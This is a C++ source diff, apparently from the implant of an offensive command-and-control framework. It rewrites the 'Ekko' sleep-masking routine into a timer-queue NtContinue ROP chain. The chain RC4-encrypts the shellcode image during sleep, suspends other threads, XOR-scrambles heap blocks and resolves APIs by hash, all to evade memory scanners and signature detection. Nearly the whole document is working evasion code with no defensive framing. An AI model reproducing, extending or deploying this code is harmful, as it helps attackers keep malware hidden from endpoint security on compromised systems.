@@ -253,323 +253,383 @@ static auto declfn mask_post_sleep( instance& inst ) -> void {
 
 #elif SLEEP_MASK_TYPE == MASK_EKKO
 
-/* ── Ekko: Timer-queue ROP sleep obfuscation (x64 only) ──
+/* ── Ekko v2: Timer-queue ROP with heap obfuscation (x64 only) ──
  *
- * Uses CreateTimerQueueTimer to schedule ROP gadgets that:
- *   1. Flip image memory to RW
- *   2. RC4-encrypt the entire shellcode image via SystemFunction032
- *   3. Sleep via WaitForSingleObject (image is encrypted during this)
- *   4. RC4-decrypt the image (symmetric - same key)
- *   5. Restore RX permissions
- *   6. Signal completion event
+ * Uses RtlCreateTimer (ntdll) to schedule a 7-context NtContinue ROP chain:
+ *   [0] WaitForSingleObject(EvntStart, INFINITE)  - gate until ready
+ *   [1] VirtualProtect(RW)                        - flip image to writable
+ *   [2] SystemFunction032(encrypt)                - RC4-encrypt shellcode image
+ *   [3] WaitForSingleObject(process, timeout)     - sleep while encrypted
+ *   [4] SystemFunction032(decrypt)                - RC4-decrypt (symmetric)
+ *   [5] VirtualProtect(RX)                        - restore execute permissions
+ *   [6] SetEvent(EvntEnd)                         - signal completion
  *
- * Because encrypt/decrypt/sleep happen in ntdll timer-thread context (outside
- * the agent image), the image is fully encrypted in memory for the entire
- * sleep duration. Defeats memory scanners, YARA, and signature matching.
- *
- * Each timer callback receives a single LPVOID. For functions needing multiple
- * arguments, we build a CONTEXT struct and call NtContinue - the timer callback
- * target is NtContinue, and the LPVOID is a pointer to a CONTEXT whose RIP/RCX/
- * RDX/R8/R9 encode the real function call.
+ * Additionally:
+ *   - Suspends all threads (except current + timer worker) before sleep
+ *   - XOR-obfuscates all non-default heap blocks with random keys
+ *   - Uses NtSignalAndWaitForSingleObject to atomically trigger + wait
+ *   - Three events for phased synchronization (timer/start/end)
+ *   - Worker thread ID captured via timer callback in phase 1
  *
  * NOTE: x64 only. On x86 builds this falls back to MASK_DEFAULT behavior.
  */
 
 #ifdef _WIN64
 
-/* RC4 encrypt/decrypt via undocumented SystemFunction032 */
 typedef struct _USTRING {
     DWORD Length;
     DWORD MaximumLength;
     PVOID Buffer;
 } USTRING, *PUSTRING;
 
-typedef NTSTATUS (NTAPI *fnSystemFunction032)( PUSTRING data, PUSTRING key );
-typedef HANDLE   (WINAPI *fnCreateTimerQueue)( void );
-typedef BOOL     (WINAPI *fnCreateTimerQueueTimer)(
-    PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG );
-typedef BOOL     (WINAPI *fnDeleteTimerQueue)( HANDLE );
-typedef HANDLE   (WINAPI *fnCreateEventW)( LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCWSTR );
-typedef BOOL     (WINAPI *fnSetEvent)( HANDLE );
+typedef struct _EKKO_HEAP_OBF {
+    BYTE ObfKeys[16];
+} EKKO_HEAP_OBF;
+
+typedef NTSTATUS (NTAPI  *fnRtlCreateTimerQueue)( PHANDLE );
+typedef NTSTATUS (NTAPI  *fnRtlCreateTimer)( HANDLE, PHANDLE, WAITORTIMERCALLBACKFUNC, PVOID, ULONG, ULONG, ULONG );
+typedef NTSTATUS (NTAPI  *fnRtlDeleteTimerQueue)( HANDLE );
+typedef NTSTATUS (NTAPI  *fnNtCreateEvent)( PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, ULONG, BOOLEAN );
+typedef NTSTATUS (NTAPI  *fnNtWaitForSingleObject)( HANDLE, BOOLEAN, PLARGE_INTEGER );
+typedef NTSTATUS (NTAPI  *fnNtSignalAndWait)( HANDLE, HANDLE, BOOLEAN, PLARGE_INTEGER );
+typedef NTSTATUS (NTAPI  *fnSystemFunction032)( PUSTRING, PUSTRING );
 typedef VOID     (NTAPI  *fnNtContinue)( PCONTEXT, BOOLEAN );
 typedef VOID     (NTAPI  *fnRtlCaptureContext)( PCONTEXT );
+typedef BOOL     (WINAPI *fnSetEvent)( HANDLE );
+typedef HANDLE   (WINAPI *fnCreateToolhelp32Snapshot)( DWORD, DWORD );
+typedef BOOL     (WINAPI *fnThread32First)( HANDLE, LPTHREADENTRY32 );
+typedef BOOL     (WINAPI *fnThread32Next)( HANDLE, LPTHREADENTRY32 );
+typedef HANDLE   (WINAPI *fnOpenThread)( DWORD, BOOL, DWORD );
+typedef DWORD    (WINAPI *fnSuspendThread)( HANDLE );
+typedef DWORD    (WINAPI *fnResumeThread)( HANDLE );
+typedef ULONG    (WINAPI *fnGetProcessHeaps)( ULONG, PHANDLE );
+typedef BOOL     (WINAPI *fnHeapWalk)( HANDLE, LPPROCESS_HEAP_ENTRY );
 
-/* Helper: set up a CONTEXT to call func(a,b,c,d) via NtContinue.
- * The template context must have been captured via RtlCaptureContext first.
- *
- * When NtContinue executes this context, the timer-thread context is replaced:
- * RIP → func, RCX-R9 → args, RSP → aligned stack with return address.
- * The return address at [RSP] points to RtlExitUserThread(0) so the timer
- * callback thread exits cleanly after the gadget function returns. */
-static auto declfn ekko_setup_context(
-    PCONTEXT ctx_template,
-    PCONTEXT ctx_out,
-    uintptr_t func,
-    uintptr_t arg1,
-    uintptr_t arg2,
-    uintptr_t arg3,
-    uintptr_t arg4,
-    uintptr_t ret_gadget
+static auto declfn ekko_xor_cipher(
+    uint8_t* data, uint32_t size, uint8_t* key, uint32_t key_size
 ) -> void {
-    /* Copy the captured context as a base */
-    auto dst = reinterpret_cast<uint8_t*>( ctx_out );
-    auto src = reinterpret_cast<const uint8_t*>( ctx_template );
-    for ( uint32_t i = 0; i < sizeof(CONTEXT); i++ )
-        dst[i] = src[i];
+    for ( uint32_t i = 0, j = 0; i < size; i++, j++ ) {
+        if ( j == key_size ) j = 0;
+        if ( i % 2 == 0 )
+            data[i] ^= key[j];
+        else
+            data[i] ^= key[j] ^ static_cast<uint8_t>( j );
+    }
+}
 
-    ctx_out->Rip = func;
-    ctx_out->Rcx = arg1;
-    ctx_out->Rdx = arg2;
-    ctx_out->R8  = arg3;
-    ctx_out->R9  = arg4;
+static auto declfn ekko_suspend_threads(
+    instance& inst, DWORD worker_tid
+) -> void {
+    DWORD pid = RtlGetCurrentProcessId();
+    DWORD tid = RtlGetCurrentThreadId();
 
-    /* Set up the stack: RSP aligned to 16-byte boundary (as if a call just
-     * pushed a return address, so RSP is 16n+8 after push = 16n-8 before).
-     * Drop RSP by a frame to avoid clobbering, then place return address. */
-    ctx_out->Rsp &= ~0xFull;
-    ctx_out->Rsp -= 8;
-    *reinterpret_cast<uintptr_t*>( ctx_out->Rsp ) = ret_gadget;
+    auto pSnap = reinterpret_cast<fnCreateToolhelp32Snapshot>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "CreateToolhelp32Snapshot" ) ) );
+    auto pFirst = reinterpret_cast<fnThread32First>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "Thread32First" ) ) );
+    auto pNext = reinterpret_cast<fnThread32Next>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "Thread32Next" ) ) );
+    auto pOpen = reinterpret_cast<fnOpenThread>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "OpenThread" ) ) );
+    auto pSuspend = reinterpret_cast<fnSuspendThread>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "SuspendThread" ) ) );
+
+    if ( !pSnap || !pFirst || !pNext || !pOpen || !pSuspend ) return;
+
+    HANDLE snap = pSnap( TH32CS_SNAPTHREAD, pid );
+    if ( snap == INVALID_HANDLE_VALUE ) return;
+
+    THREADENTRY32 te = {};
+    te.dwSize = sizeof( THREADENTRY32 );
+
+    if ( pFirst( snap, &te ) ) {
+        do {
+            if ( te.th32OwnerProcessID == pid &&
+                 te.th32ThreadID != tid &&
+                 te.th32ThreadID != worker_tid ) {
+                HANDLE ht = pOpen( THREAD_ALL_ACCESS, FALSE, te.th32ThreadID );
+                if ( ht ) {
+                    pSuspend( ht );
+                    inst.kernel32.CloseHandle( ht );
+                }
+            }
+        } while ( pNext( snap, &te ) );
+    }
+    inst.kernel32.CloseHandle( snap );
+}
+
+static auto declfn ekko_resume_threads(
+    instance& inst, DWORD worker_tid
+) -> void {
+    DWORD pid = RtlGetCurrentProcessId();
+    DWORD tid = RtlGetCurrentThreadId();
+
+    auto pSnap = reinterpret_cast<fnCreateToolhelp32Snapshot>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "CreateToolhelp32Snapshot" ) ) );
+    auto pFirst = reinterpret_cast<fnThread32First>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "Thread32First" ) ) );
+    auto pNext = reinterpret_cast<fnThread32Next>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "Thread32Next" ) ) );
+    auto pOpen = reinterpret_cast<fnOpenThread>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "OpenThread" ) ) );
+    auto pResume = reinterpret_cast<fnResumeThread>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "ResumeThread" ) ) );
+
+    if ( !pSnap || !pFirst || !pNext || !pOpen || !pResume ) return;
+
+    HANDLE snap = pSnap( TH32CS_SNAPTHREAD, pid );
+    if ( snap == INVALID_HANDLE_VALUE ) return;
+
+    THREADENTRY32 te = {};
+    te.dwSize = sizeof( THREADENTRY32 );
+
+    if ( pFirst( snap, &te ) ) {
+        do {
+            if ( te.th32OwnerProcessID == pid &&
+                 te.th32ThreadID != tid &&
+                 te.th32ThreadID != worker_tid ) {
+                HANDLE ht = pOpen( THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID );
+                if ( ht ) {
+                    pResume( ht );
+                    inst.kernel32.CloseHandle( ht );
+                }
+            }
+        } while ( pNext( snap, &te ) );
+    }
+    inst.kernel32.CloseHandle( snap );
+}
+
+static auto declfn ekko_heap_obfuscate(
+    instance& inst, EKKO_HEAP_OBF* obf, DWORD worker_tid, bool start
+) -> void {
+    auto pGetProcessHeaps = reinterpret_cast<fnGetProcessHeaps>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "GetProcessHeaps" ) ) );
+    auto pHeapWalk = reinterpret_cast<fnHeapWalk>(
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "HeapWalk" ) ) );
+
+    if ( !pGetProcessHeaps || !pHeapWalk ) return;
+
+    ULONG num_heaps = pGetProcessHeaps( 0, nullptr );
+    if ( num_heaps == 0 ) return;
+
+    HANDLE heap_buf[64] = {};
+    if ( num_heaps > 64 ) num_heaps = 64;
+    num_heaps = pGetProcessHeaps( num_heaps, heap_buf );
+
+    if ( start ) {
+        ULONG seed = inst.kernel32.GetTickCount();
+        for ( uint32_t i = 0; i < 16; i++ ) {
+            seed = inst.ntdll.RtlRandomEx( &seed );
+            obf->ObfKeys[i] = static_cast<BYTE>( seed & 0xFF );
+        }
+        ekko_suspend_threads( inst, worker_tid );
+    } else {
+        ekko_resume_threads( inst, worker_tid );
+    }
+
+    HANDLE default_heap = NtCurrentPeb()->ProcessHeap;
+
+    for ( ULONG i = 0; i < num_heaps; i++ ) {
+        if ( heap_buf[i] == default_heap ) continue;
+
+        PROCESS_HEAP_ENTRY entry = {};
+        while ( pHeapWalk( heap_buf[i], &entry ) ) {
+            if ( entry.wFlags & PROCESS_HEAP_ENTRY_BUSY ) {
+                ekko_xor_cipher(
+                    reinterpret_cast<uint8_t*>( entry.lpData ),
+                    entry.cbData, obf->ObfKeys, 16 );
+            }
+        }
+    }
+}
+
+static auto NTAPI ekko_get_worker_tid( PVOID param, BOOLEAN ) -> void {
+    *reinterpret_cast<DWORD*>( param ) = RtlGetCurrentThreadId();
 }
 
 static auto declfn ekko_sleep( instance& inst, uint32_t sleep_ms ) -> void {
 
-    /* ── resolve all required APIs ── */
+    /* ── resolve ntdll APIs via hash ── */
 
-    auto pCreateTimerQueue = reinterpret_cast<fnCreateTimerQueue>(
-        resolve::_api( inst.kernel32.handle,
-            expr::hash_string( "CreateTimerQueue" ) ) );
-
-    auto pCreateTimerQueueTimer = reinterpret_cast<fnCreateTimerQueueTimer>(
-        resolve::_api( inst.kernel32.handle,
-            expr::hash_string( "CreateTimerQueueTimer" ) ) );
-
-    auto pDeleteTimerQueue = reinterpret_cast<fnDeleteTimerQueue>(
-        resolve::_api( inst.kernel32.handle,
-            expr::hash_string( "DeleteTimerQueue" ) ) );
-
-    auto pCreateEventW = reinterpret_cast<fnCreateEventW>(
-        resolve::_api( inst.kernel32.handle,
-            expr::hash_string( "CreateEventW" ) ) );
+    auto pRtlCreateTimerQueue = reinterpret_cast<fnRtlCreateTimerQueue>(
+        resolve::_api( inst.ntdll.handle, expr::hash_string( "RtlCreateTimerQueue" ) ) );
+    auto pRtlCreateTimer = reinterpret_cast<fnRtlCreateTimer>(
+        resolve::_api( inst.ntdll.handle, expr::hash_string( "RtlCreateTimer" ) ) );
+    auto pRtlDeleteTimerQueue = reinterpret_cast<fnRtlDeleteTimerQueue>(
+        resolve::_api( inst.ntdll.handle, expr::hash_string( "RtlDeleteTimerQueue" ) ) );
+    auto pNtCreateEvent = reinterpret_cast<fnNtCreateEvent>(
+        resolve::_api( inst.ntdll.handle, expr::hash_string( "NtCreateEvent" ) ) );
+    auto pNtWaitForSingleObject = reinterpret_cast<fnNtWaitForSingleObject>(
+        resolve::_api( inst.ntdll.handle, expr::hash_string( "NtWaitForSingleObject" ) ) );
+    auto pNtSignalAndWait = reinterpret_cast<fnNtSignalAndWait>(
+        resolve::_api( inst.ntdll.handle, expr::hash_string( "NtSignalAndWaitForSingleObject" ) ) );
+    auto pNtContinue = reinterpret_cast<fnNtContinue>(
+        resolve::_api( inst.ntdll.handle, expr::hash_string( "NtContinue" ) ) );
+    auto pRtlCaptureContext = reinterpret_cast<fnRtlCaptureContext>(
+        resolve::_api( inst.ntdll.handle, expr::hash_string( "RtlCaptureContext" ) ) );
 
     auto pSetEvent = reinterpret_cast<fnSetEvent>(
-        resolve::_api( inst.kernel32.handle,
-            expr::hash_string( "SetEvent" ) ) );
+        resolve::_api( inst.kernel32.handle, expr::hash_string( "SetEvent" ) ) );
 
-    auto pNtContinue = reinterpret_cast<fnNtContinue>(
-        resolve::_api( inst.ntdll.handle,
-            expr::hash_string( "NtContinue" ) ) );
-
-    auto pRtlCaptureContext = reinterpret_cast<fnRtlCaptureContext>(
-        resolve::_api( inst.ntdll.handle,
-            expr::hash_string( "RtlCaptureContext" ) ) );
-
-    /* SystemFunction032 lives in advapi32 (forwarded from cryptsp on modern Windows) */
-    auto hAdvapi32 = inst.kernel32.LoadLibraryA( symbol<LPCSTR>( "advapi32.dll" ) );
+    /* SystemFunction032 from advapi32 (already loaded at init) */
     auto pSystemFunction032 = reinterpret_cast<fnSystemFunction032>(
-        inst.kernel32.GetProcAddress( hAdvapi32,
-            symbol<LPCSTR>( "SystemFunction032" ) ) );
+        resolve::_api( inst.advapi32.handle, expr::hash_string( "SystemFunction032" ) ) );
 
-    /* Find a `ret` (0xC3) gadget in ntdll .text for the NtContinue return address.
-     * When the target function returns, it hits this `ret` which pops the next
-     * value from RSP - effectively cleanly exiting the timer callback. */
-    uintptr_t ret_gadget = 0;
-    {
-        auto ntdll_base = reinterpret_cast<uint8_t*>( inst.ntdll.handle );
-        auto dos = reinterpret_cast<IMAGE_DOS_HEADER*>( ntdll_base );
-        auto nt  = reinterpret_cast<IMAGE_NT_HEADERS*>( ntdll_base + dos->e_lfanew );
-        auto sec = IMAGE_FIRST_SECTION( nt );
-        for ( uint16_t s = 0; s < nt->FileHeader.NumberOfSections; s++ ) {
-            if ( !( sec[s].Characteristics & IMAGE_SCN_MEM_EXECUTE ) ) continue;
-            auto sec_base = ntdll_base + sec[s].VirtualAddress;
-            auto sec_size = sec[s].Misc.VirtualSize;
-            for ( uint32_t j = 0; j < sec_size; j++ ) {
-                if ( sec_base[j] == 0xC3 ) {
-                    ret_gadget = reinterpret_cast<uintptr_t>( sec_base + j );
-                    goto found_gadget;
-                }
-            }
-        }
-    found_gadget:;
-    }
-
-    /* Validate all pointers - fall back to simple masking on failure */
-    if ( !pCreateTimerQueue || !pCreateTimerQueueTimer || !pDeleteTimerQueue ||
-         !pCreateEventW || !pSetEvent || !pNtContinue || !pRtlCaptureContext ||
-         !pSystemFunction032 || !ret_gadget ) {
+    if ( !pRtlCreateTimerQueue || !pRtlCreateTimer || !pRtlDeleteTimerQueue ||
+         !pNtCreateEvent || !pNtWaitForSingleObject || !pNtSignalAndWait ||
+         !pNtContinue || !pRtlCaptureContext || !pSetEvent || !pSystemFunction032 ) {
         DBG_PRINT( inst, "ekko: API resolution failed, falling back to XOR mask\n" );
         xor_sensitive_data( inst );
         return;
     }
 
-    /* ── create synchronization primitives ── */
+    /* ── image base/size and fresh RC4 key ── */
 
-    HANDLE hEvent = pCreateEventW( nullptr, FALSE, FALSE, nullptr );
-    if ( !hEvent ) {
-        xor_sensitive_data( inst );
-        return;
-    }
+    PVOID  img_base = reinterpret_cast<PVOID>( inst.evasion.ekko.img_base );
+    ULONG  img_size = inst.evasion.ekko.img_size;
 
-    HANDLE hTimerQueue = pCreateTimerQueue();
-    if ( !hTimerQueue ) {
-        inst.kernel32.CloseHandle( hEvent );
-        xor_sensitive_data( inst );
-        return;
-    }
-
-    /* ── build SystemFunction032 argument structs ── */
-
-    USTRING img_data = {};
-    img_data.Length        = inst.evasion.ekko.img_size;
-    img_data.MaximumLength = inst.evasion.ekko.img_size;
-    img_data.Buffer        = reinterpret_cast<PVOID>( inst.evasion.ekko.img_base );
+    BYTE rnd_key[16] = {};
+    inst.bcrypt_mod.BCryptGenRandom( nullptr, rnd_key, 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG );
 
     USTRING key_data = {};
+    key_data.Buffer        = rnd_key;
     key_data.Length        = 16;
     key_data.MaximumLength = 16;
-    key_data.Buffer        = inst.evasion.ekko.rc4_key;
 
-    /* Scratch space for VirtualProtect's old-protect output parameter */
-    DWORD old_protect = 0;
+    USTRING img_data = {};
+    img_data.Buffer        = img_base;
+    img_data.Length        = img_size;
+    img_data.MaximumLength = img_size;
 
-    /* ── capture current context as template for ROP ── */
+    /* ── create timer queue and three events ── */
 
-    CONTEXT ctx_template;
-    __builtin_memset( &ctx_template, 0, sizeof(ctx_template) );
-    ctx_template.ContextFlags = CONTEXT_FULL;
-    pRtlCaptureContext( &ctx_template );
+    HANDLE queue     = nullptr;
+    HANDLE evt_timer = nullptr;
+    HANDLE evt_start = nullptr;
+    HANDLE evt_end   = nullptr;
+    HANDLE timer     = nullptr;
+    DWORD  delay     = 0;
+    DWORD  value     = 0;
+    DWORD  worker_tid = 0;
+    EKKO_HEAP_OBF heap_obf = {};
 
-    /* ── build per-timer CONTEXT structs ── */
+    if ( pRtlCreateTimerQueue( &queue ) != 0 ) {
+        xor_sensitive_data( inst );
+        return;
+    }
 
-    /* We need 6 contexts for 6 NtContinue calls:
-     *   [0] VirtualProtect( img_base, img_size, PAGE_READWRITE, &old_protect )
-     *   [1] SystemFunction032( &img_data, &key_data )      - encrypt
-     *   [2] WaitForSingleObject( hEvent, sleep_ms )         - sleep
-     *   [3] SystemFunction032( &img_data, &key_data )      - decrypt
-     *   [4] VirtualProtect( img_base, img_size, old_protect, &old_protect )
-     *       ^ We use PAGE_EXECUTE_READ here since we know the original prot
-     *   [5] SetEvent( hEvent )                              - signal done
-     */
+    /* NotificationEvent = 0 */
+    if ( pNtCreateEvent( &evt_timer, EVENT_ALL_ACCESS, nullptr, 0, FALSE ) != 0 ||
+         pNtCreateEvent( &evt_start, EVENT_ALL_ACCESS, nullptr, 0, FALSE ) != 0 ||
+         pNtCreateEvent( &evt_end,   EVENT_ALL_ACCESS, nullptr, 0, FALSE ) != 0 ) {
+        goto ekko_leave;
+    }
 
-    CONTEXT rop_ctx[6];
+    /* ── phase 1: capture worker thread ID and initial CONTEXT ── */
+    {
+        CONTEXT ctx_init = {};
 
-    /* Timer 0: VirtualProtect → RW */
-    ekko_setup_context(
-        &ctx_template, &rop_ctx[0],
-        reinterpret_cast<uintptr_t>( inst.kernel32.VirtualProtect ),
-        reinterpret_cast<uintptr_t>( inst.evasion.ekko.img_base ),
-        static_cast<uintptr_t>( inst.evasion.ekko.img_size ),
-        static_cast<uintptr_t>( PAGE_READWRITE ),
-        reinterpret_cast<uintptr_t>( &old_protect ),
-        ret_gadget
-    );
+        if ( pRtlCreateTimer( queue, &timer,
+                reinterpret_cast<WAITORTIMERCALLBACKFUNC>( ekko_get_worker_tid ),
+                &worker_tid, delay += 100, 0, WT_EXECUTEINTIMERTHREAD ) != 0 )
+            goto ekko_leave;
 
-    /* Timer 1: SystemFunction032 - encrypt */
-    ekko_setup_context(
-        &ctx_template, &rop_ctx[1],
-        reinterpret_cast<uintptr_t>( pSystemFunction032 ),
-        reinterpret_cast<uintptr_t>( &img_data ),
-        reinterpret_cast<uintptr_t>( &key_data ),
-        0, 0,
-        ret_gadget
-    );
+        if ( pRtlCreateTimer( queue, &timer,
+                reinterpret_cast<WAITORTIMERCALLBACKFUNC>( pRtlCaptureContext ),
+                &ctx_init, delay += 100, 0, WT_EXECUTEINTIMERTHREAD ) != 0 )
+            goto ekko_leave;
 
-    /* Timer 2: WaitForSingleObject - the actual sleep (image encrypted) */
-    ekko_setup_context(
-        &ctx_template, &rop_ctx[2],
-        reinterpret_cast<uintptr_t>( inst.kernel32.WaitForSingleObject ),
-        reinterpret_cast<uintptr_t>( hEvent ),
-        static_cast<uintptr_t>( sleep_ms ),
-        0, 0,
-        ret_gadget
-    );
+        if ( pRtlCreateTimer( queue, &timer,
+                reinterpret_cast<WAITORTIMERCALLBACKFUNC>( pSetEvent ),
+                evt_timer, delay += 100, 0, WT_EXECUTEINTIMERTHREAD ) != 0 )
+            goto ekko_leave;
 
-    /* Timer 3: SystemFunction032 - decrypt (RC4 is symmetric) */
-    ekko_setup_context(
-        &ctx_template, &rop_ctx[3],
-        reinterpret_cast<uintptr_t>( pSystemFunction032 ),
-        reinterpret_cast<uintptr_t>( &img_data ),
-        reinterpret_cast<uintptr_t>( &key_data ),
-        0, 0,
-        ret_gadget
-    );
+        if ( pNtWaitForSingleObject( evt_timer, FALSE, nullptr ) != 0 )
+            goto ekko_leave;
 
-    /* Timer 4: VirtualProtect → restore RX */
-    ekko_setup_context(
-        &ctx_template, &rop_ctx[4],
-        reinterpret_cast<uintptr_t>( inst.kernel32.VirtualProtect ),
-        reinterpret_cast<uintptr_t>( inst.evasion.ekko.img_base ),
-        static_cast<uintptr_t>( inst.evasion.ekko.img_size ),
-        static_cast<uintptr_t>( PAGE_EXECUTE_READ ),
-        reinterpret_cast<uintptr_t>( &old_protect ),
-        ret_gadget
-    );
+        /* ── phase 2: build 7-context ROP chain ── */
 
-    /* Timer 5: SetEvent - signal completion */
-    ekko_setup_context(
-        &ctx_template, &rop_ctx[5],
-        reinterpret_cast<uintptr_t>( pSetEvent ),
-        reinterpret_cast<uintptr_t>( hEvent ),
-        0, 0, 0,
-        ret_gadget
-    );
-
-    /* ── queue the timers ──
-     * Each timer fires NtContinue with its CONTEXT* as the parameter.
-     * DueTimes are staggered to ensure sequential execution.
-     * WT_EXECUTEINTIMERTHREAD ensures single-threaded ordering. */
-
-    HANDLE hTimers[6] = {};
-
-    /* DueTimes staggered with 200ms spacing. Timer 0 starts at 200ms to give
-     * the main thread time to finish queueing all timers and call
-     * WaitForSingleObject before the first timer fires. */
-    DWORD  due_times[6] = { 200, 400, 600, 800, 1000, 1200 };
-
-    bool queued_ok = true;
-    for ( int i = 0; i < 6; i++ ) {
-        if ( !pCreateTimerQueueTimer(
-                &hTimers[i],
-                hTimerQueue,
-                reinterpret_cast<WAITORTIMERCALLBACK>( pNtContinue ),
-                &rop_ctx[i],
-                due_times[i],
-                0,                          /* Period = 0 -> fires once */
-                WT_EXECUTEINTIMERTHREAD ) )  /* Execute in timer thread for ordering */
-        {
-            queued_ok = false;
-            DBG_PRINT( inst, "ekko: failed to queue timer %d\n", i );
-            break;
+        CONTEXT ctx[7] = {};
+        for ( int i = 0; i < 7; i++ ) {
+            auto dst = reinterpret_cast<uint8_t*>( &ctx[i] );
+            auto src = reinterpret_cast<const uint8_t*>( &ctx_init );
+            for ( uint32_t b = 0; b < sizeof( CONTEXT ); b++ ) dst[b] = src[b];
+            ctx[i].Rsp -= sizeof( PVOID );
         }
+
+        /* [0] WaitForSingleObject(EvntStart, INFINITE) - gate */
+        ctx[0].Rip = reinterpret_cast<DWORD64>( inst.kernel32.WaitForSingleObject );
+        ctx[0].Rcx = reinterpret_cast<DWORD64>( evt_start );
+        ctx[0].Rdx = static_cast<DWORD64>( INFINITE );
+        ctx[0].R8  = 0;
+
+        /* [1] VirtualProtect(img, size, PAGE_READWRITE, &value) */
+        ctx[1].Rip = reinterpret_cast<DWORD64>( inst.kernel32.VirtualProtect );
+        ctx[1].Rcx = reinterpret_cast<DWORD64>( img_base );
+        ctx[1].Rdx = static_cast<DWORD64>( img_size );
+        ctx[1].R8  = static_cast<DWORD64>( PAGE_READWRITE );
+        ctx[1].R9  = reinterpret_cast<DWORD64>( &value );
+
+        /* [2] SystemFunction032(&img_data, &key_data) - encrypt */
+        ctx[2].Rip = reinterpret_cast<DWORD64>( pSystemFunction032 );
+        ctx[2].Rcx = reinterpret_cast<DWORD64>( &img_data );
+        ctx[2].Rdx = reinterpret_cast<DWORD64>( &key_data );
+
+        /* [3] WaitForSingleObject(current_process, sleep_ms) - sleep */
+        ctx[3].Rip = reinterpret_cast<DWORD64>( inst.kernel32.WaitForSingleObject );
+        ctx[3].Rcx = reinterpret_cast<DWORD64>( static_cast<HANDLE>( (HANDLE)(LONG_PTR)-1 ) );
+        ctx[3].Rdx = static_cast<DWORD64>( sleep_ms );
+        ctx[3].R8  = 0;
+
+        /* [4] SystemFunction032(&img_data, &key_data) - decrypt */
+        ctx[4].Rip = reinterpret_cast<DWORD64>( pSystemFunction032 );
+        ctx[4].Rcx = reinterpret_cast<DWORD64>( &img_data );
+        ctx[4].Rdx = reinterpret_cast<DWORD64>( &key_data );
+
+        /* [5] VirtualProtect(img, size, PAGE_EXECUTE_READ, &value) */
+        ctx[5].Rip = reinterpret_cast<DWORD64>( inst.kernel32.VirtualProtect );
+        ctx[5].Rcx = reinterpret_cast<DWORD64>( img_base );
+        ctx[5].Rdx = static_cast<DWORD64>( img_size );
+        ctx[5].R8  = static_cast<DWORD64>( PAGE_EXECUTE_READ );
+        ctx[5].R9  = reinterpret_cast<DWORD64>( &value );
+
+        /* [6] SetEvent(EvntEnd) - signal completion */
+        ctx[6].Rip = reinterpret_cast<DWORD64>( pSetEvent );
+        ctx[6].Rcx = reinterpret_cast<DWORD64>( evt_end );
+
+        /* ── obfuscate heap + suspend threads ── */
+        ekko_heap_obfuscate( inst, &heap_obf, worker_tid, true );
+        xor_sensitive_data( inst );
+
+        /* ── queue the 7 NtContinue timer callbacks ── */
+        bool ok = true;
+        for ( int i = 0; i < 7; i++ ) {
+            if ( pRtlCreateTimer( queue, &timer,
+                    reinterpret_cast<WAITORTIMERCALLBACKFUNC>( pNtContinue ),
+                    &ctx[i], delay += 100, 0, WT_EXECUTEINTIMERTHREAD ) != 0 ) {
+                ok = false;
+                DBG_PRINT( inst, "ekko: RtlCreateTimer[%d] failed\n", i );
+                break;
+            }
+        }
+
+        if ( ok ) {
+            /* Atomically signal EvntStart and wait on EvntEnd */
+            pNtSignalAndWait( evt_start, evt_end, FALSE, nullptr );
+        }
+
+        /* ── restore ── */
+        xor_sensitive_data( inst );
+        ekko_heap_obfuscate( inst, &heap_obf, worker_tid, false );
     }
 
-    if ( queued_ok ) {
-        /* XOR sensitive fields before the timers start firing.
-         * Timer 0 fires at 200ms, giving us time to mask data and enter the wait. */
-        xor_sensitive_data( inst );
-
-        /* Wait for the final SetEvent timer to signal completion.
-         * Add generous timeout: sleep_ms + 10s for timer scheduling overhead.
-         * If this times out, something went wrong - we still try to recover. */
-        inst.kernel32.WaitForSingleObject( hEvent, sleep_ms + 10000 );
-
-        /* Restore sensitive data - image is now decrypted and RX again */
-        xor_sensitive_data( inst );
-    } else {
-        /* Timer queue setup failed - fall back to simple XOR masking */
-        xor_sensitive_data( inst );
-        LARGE_INTEGER delay;
-        delay.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
-        inst.ntdll.NtDelayExecution( FALSE, &delay );
-        xor_sensitive_data( inst );
-    }
-
-    /* ── cleanup ── */
-    pDeleteTimerQueue( hTimerQueue );
-    inst.kernel32.CloseHandle( hEvent );
+ekko_leave:
+    if ( queue )     pRtlDeleteTimerQueue( queue );
+    if ( evt_timer ) inst.kernel32.CloseHandle( evt_timer );
+    if ( evt_start ) inst.kernel32.CloseHandle( evt_start );
+    if ( evt_end )   inst.kernel32.CloseHandle( evt_end );
 }
 
-/* Ekko replaces the entire sleep cycle, so pre/post are no-ops.
- * The actual orchestration happens via ekko_sleep() called from main.cc. */
 static auto declfn mask_pre_sleep( instance& inst ) -> void {
     (void)inst;
 }
@@ -578,7 +638,7 @@ static auto declfn mask_post_sleep( instance& inst ) -> void {
     (void)inst;
 }
 
-#else /* x86 fallback - Ekko ROP requires x64 CONTEXT manipulation */
+#else /* x86 fallback */
 
 static auto declfn mask_pre_sleep( instance& inst ) -> void {
     if ( !inst.evasion.ekko.initialized ) return;
